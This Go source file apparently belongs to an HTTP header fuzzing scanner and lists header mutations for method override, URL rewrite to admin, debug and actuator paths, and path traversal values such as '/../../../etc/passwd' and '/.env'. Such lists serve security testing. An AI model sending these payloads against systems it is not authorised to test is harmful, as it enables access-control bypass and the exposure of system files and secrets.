package headers

import "github.com/cc1a2b/HHunter/engine"

func GetOverrideMutations() []engine.Mutation {
	return []engine.Mutation{
		// HTTP method override headers with various methods
		{Header: "X-HTTP-Method-Override", Value: "PUT", Category: "Override", Impact: "Method Override to PUT"},
		{Header: "X-HTTP-Method-Override", Value: "DELETE", Category: "Override", Impact: "Method Override to DELETE"},
		{Header: "X-HTTP-Method-Override", Value: "PATCH", Category: "Override", Impact: "Method Override to PATCH"},
		{Header: "X-HTTP-Method-Override", Value: "TRACE", Category: "Override", Impact: "Method Override to TRACE"},
		{Header: "X-HTTP-Method-Override", Value: "OPTIONS", Category: "Override", Impact: "Method Override to OPTIONS"},
		{Header: "X-HTTP-Method-Override", Value: "HEAD", Category: "Override", Impact: "Method Override to HEAD"},
		{Header: "X-HTTP-Method-Override", Value: "CONNECT", Category: "Override", Impact: "Method Override to CONNECT"},
		{Header: "X-HTTP-Method-Override", Value: "PROPFIND", Category: "Override", Impact: "Method Override to PROPFIND (WebDAV)"},
		{Header: "X-HTTP-Method-Override", Value: "PROPPATCH", Category: "Override", Impact: "Method Override to PROPPATCH"},
		{Header: "X-HTTP-Method-Override", Value: "MKCOL", Category: "Override", Impact: "Method Override to MKCOL"},
		{Header: "X-HTTP-Method-Override", Value: "COPY", Category: "Override", Impact: "Method Override to COPY"},
		{Header: "X-HTTP-Method-Override", Value: "MOVE", Category: "Override", Impact: "Method Override to MOVE"},
		{Header: "X-HTTP-Method-Override", Value: "LOCK", Category: "Override", Impact: "Method Override to LOCK"},
		{Header: "X-HTTP-Method-Override", Value: "UNLOCK", Category: "Override", Impact: "Method Override to UNLOCK"},

		// Alternative method override headers
		{Header: "X-Method-Override", Value: "PUT", Category: "Override", Impact: "X-Method-Override PUT"},
		{Header: "X-Method-Override", Value: "DELETE", Category: "Override", Impact: "X-Method-Override DELETE"},
		{Header: "X-Method-Override", Value: "PATCH", Category: "Override", Impact: "X-Method-Override PATCH"},
		{Header: "X-HTTP-Method", Value: "PUT", Category: "Override", Impact: "X-HTTP-Method PUT"},
		{Header: "X-HTTP-Method", Value: "DELETE", Category: "Override", Impact: "X-HTTP-Method DELETE"},
		{Header: "X-HTTP-Method", Value: "PATCH", Category: "Override", Impact: "X-HTTP-Method PATCH"},
		{Header: "_method", Value: "PUT", Category: "Override", Impact: "_method PUT"},
		{Header: "_method", Value: "DELETE", Category: "Override", Impact: "_method DELETE"},
		{Header: "_method", Value: "PATCH", Category: "Override", Impact: "_method PATCH"},
		{Header: "X-Original-Method", Value: "DELETE", Category: "Override", Impact: "X-Original-Method DELETE"},
		{Header: "X-Original-Method", Value: "PUT", Category: "Override", Impact: "X-Original-Method PUT"},
		{Header: "X-Original-Method", Value: "PATCH", Category: "Override", Impact: "X-Original-Method PATCH"},
		{Header: "X-HTTP-Method-Override", Value: "POST", Category: "Override", Impact: "Method Override to POST"},
		{Header: "X-HTTP-Method-Override", Value: "GET", Category: "Override", Impact: "Method Override to GET"},
		{Header: "Override-Method", Value: "DELETE", Category: "Override", Impact: "Override-Method DELETE"},
		{Header: "Method-Override", Value: "DELETE", Category: "Override", Impact: "Method-Override DELETE"},

		// URL override / rewrite
		{Header: "X-Original-URL", Value: "/admin", Category: "Override", Impact: "URL Override to /admin"},
		{Header: "X-Original-URL", Value: "/admin/", Category: "Override", Impact: "URL Override to /admin/ (trailing slash)"},
		{Header: "X-Original-URL", Value: "/api/admin", Category: "Override", Impact: "URL Override to /api/admin"},
		{Header: "X-Original-URL", Value: "/api/v1/admin", Category: "Override", Impact: "URL Override to /api/v1/admin"},
		{Header: "X-Original-URL", Value: "/console", Category: "Override", Impact: "URL Override to /console"},
		{Header: "X-Original-URL", Value: "/dashboard", Category: "Override", Impact: "URL Override to /dashboard"},
		{Header: "X-Original-URL", Value: "/debug", Category: "Override", Impact: "URL Override to /debug"},
		{Header: "X-Original-URL", Value: "/internal", Category: "Override", Impact: "URL Override to /internal"},
		{Header: "X-Original-URL", Value: "/status", Category: "Override", Impact: "URL Override to /status"},
		{Header: "X-Original-URL", Value: "/health", Category: "Override", Impact: "URL Override to /health"},
		{Header: "X-Original-URL", Value: "/metrics", Category: "Override", Impact: "URL Override to /metrics"},
		{Header: "X-Original-URL", Value: "/env", Category: "Override", Impact: "URL Override to /env"},
		{Header: "X-Original-URL", Value: "/actuator", Category: "Override", Impact: "URL Override to /actuator"},
		{Header: "X-Original-URL", Value: "/swagger-ui.html", Category: "Override", Impact: "URL Override to Swagger UI"},
		{Header: "X-Original-URL", Value: "/graphql", Category: "Override", Impact: "URL Override to GraphQL"},
		{Header: "X-Original-URL", Value: "/.env", Category: "Override", Impact: "URL Override to .env"},
		{Header: "X-Original-URL", Value: "/server-status", Category: "Override", Impact: "URL Override to server-status"},
		{Header: "X-Original-URL", Value: "/server-info", Category: "Override", Impact: "URL Override to server-info"},
		{Header: "X-Original-URL", Value: "/wp-admin", Category: "Override", Impact: "URL Override to wp-admin"},
		{Header: "X-Original-URL", Value: "/elmah.axd", Category: "Override", Impact: "URL Override to ELMAH"},
		{Header: "X-Original-URL", Value: "/trace", Category: "Override", Impact: "URL Override to /trace"},

		{Header: "X-Rewrite-URL", Value: "/admin", Category: "Override", Impact: "URL Rewrite to /admin"},
		{Header: "X-Rewrite-URL", Value: "/api/admin", Category: "Override", Impact: "URL Rewrite to /api/admin"},
		{Header: "X-Rewrite-URL", Value: "/console", Category: "Override", Impact: "URL Rewrite to /console"},
		{Header: "X-Rewrite-URL", Value: "/actuator/env", Category: "Override", Impact: "URL Rewrite to actuator/env"},

		// Path traversal via override headers
		{Header: "X-Original-URL", Value: "/../admin", Category: "Override", Impact: "Path Traversal via URL Override"},
		{Header: "X-Original-URL", Value: "/..%2fadmin", Category: "Override", Impact: "Encoded Path Traversal via Override"},
		{Header: "X-Original-URL", Value: "/../../../etc/passwd", Category: "Override", Impact: "Deep Path Traversal via Override"},
		{Header: "X-Rewrite-URL", Value: "/../../../admin", Category: "Override", Impact: "Path Traversal via Rewrite"},
		{Header: "X-Rewrite-URL", Value: "/%2e%2e/admin", Category: "Override", Impact: "Encoded Traversal via Rewrite"},

		// Custom route override
		{Header: "X-Forwarded-Path", Value: "/admin", Category: "Override", Impact: "Path Override to /admin"},
		{Header: "X-Forwarded-Prefix", Value: "/admin", Category: "Override", Impact: "Prefix Override to /admin"},
		{Header: "X-Custom-URL", Value: "/admin", Category: "Override", Impact: "Custom URL Override to /admin"},
	}
}
